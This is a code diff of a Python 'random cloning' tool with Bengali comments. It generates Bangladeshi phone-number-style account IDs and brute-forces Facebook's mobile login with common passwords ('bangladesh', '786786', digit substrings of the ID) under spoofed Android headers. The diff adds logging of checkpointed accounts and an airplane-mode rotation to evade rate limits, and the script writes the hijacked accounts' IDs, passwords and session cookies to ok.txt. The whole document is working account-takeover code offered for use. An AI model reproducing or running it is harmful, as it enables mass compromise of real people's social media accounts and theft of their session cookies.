@@ -21,7 +21,7 @@ def banner():
 
 def main():
     banner()
-    print(f'{G}[1] START CLONING (REAL COOKIE)')
+    print(f'{G}[1] START RANDOM CLONING (REAL)')
     print(f'[0] EXIT')
     choose = input(f'\n{G}[?] CHOICE: {W}')
     if choose == '1': cloning()
@@ -30,26 +30,28 @@ def main():
 def cloning():
     banner()
     code = input(f'{G}[+] SIM CODE (017, 018, 019): {W}')
-    limit = int(input(f'{G}[+] LIMIT (10000-50000): {W}'))
+    limit = int(input(f'{G}[+] LIMIT (3000-5000): {W}'))
     
     banner()
-    print(f'{G}[+] CLONING STARTED... [OK রেজাল্ট আসা পর্যন্ত ধৈর্য ধরুন]{W}')
+    print(f'{G}[+] TARGET DOMAIN: RANDOM CLONING')
+    print(f'[+] AIRPLANE MODE: EVERY 200 IDS')
     print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××\n')
     
     ok = 0
+    cp = 0
     loop = 0
     
     for i in range(limit):
         loop += 1
-        # --- আপনার স্যারের দেওয়া আসল UID লজিক ---
+        # স্যারের দেওয়া আসল UID লজিক
         uid = f"{code}{random.randint(1111111, 9999999)}"
         
-        # --- মাল্টি-পাসওয়ার্ড লজিক (যা ১০০% কাজের গ্যারান্টি বাড়ায়) ---
-        pws = [uid, uid[6:], 'bangladesh', 'i love you', '708090']
+        # সংশোধিত পাসওয়ার্ড লজিক (৬+ অক্ষরের নিয়ম মেনে)
+        pws = [uid, uid[5:], uid[4:], 'bangladesh', '786786', '708090']
         
         for pw in pws:
-            # --- আমার দেওয়া শক্তিশালী প্রো-হেডার ---
-            ua = f"Mozilla/5.0 (Linux; Android {random.randint(8,13)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,125)}.0.0.0 Mobile Safari/537.36"
+            # প্রো-হেডার (Android 14)
+            ua = f"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
             
             headers = {
                 'authority': 'm.facebook.com',
@@ -61,7 +63,6 @@ def cloning():
                 'user-agent': ua,
             }
 
-            # --- আসল লগইন ডাটা (Response Logic) ---
             data = {
                 'lsd': uuid.uuid4().hex,
                 'jazoest': '2' + str(random.randint(1000, 9999)),
@@ -72,13 +73,11 @@ def cloning():
 
             url = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
             
-            sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
+            sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()
 
             try:
-                # --- এখানে আসল রিকোয়েস্ট পাঠানো হচ্ছে ---
                 res = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
                 
-                # --- কুকি চেক লজিক ---
                 if "c_user" in res.cookies.get_dict():
                     ok += 1
                     cookie = ";".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
@@ -87,8 +86,9 @@ def cloning():
                     with open('ok.txt', 'a') as f: f.write(f'{uid}|{pw}|{cookie}\n')
                     break 
                 elif "checkpoint" in res.cookies.get_dict():
-                    # সিপি আইডি আসলে অন্তত বোঝা যাবে কোড কাজ করছে
+                    cp += 1
                     print(f'\n{Y}[MALEK-CP💛] {uid} | {pw}')
+                    with open('cp.txt', 'a') as f: f.write(f'{uid}|{pw}\n')
                     break
             except:
                 time.sleep(2)
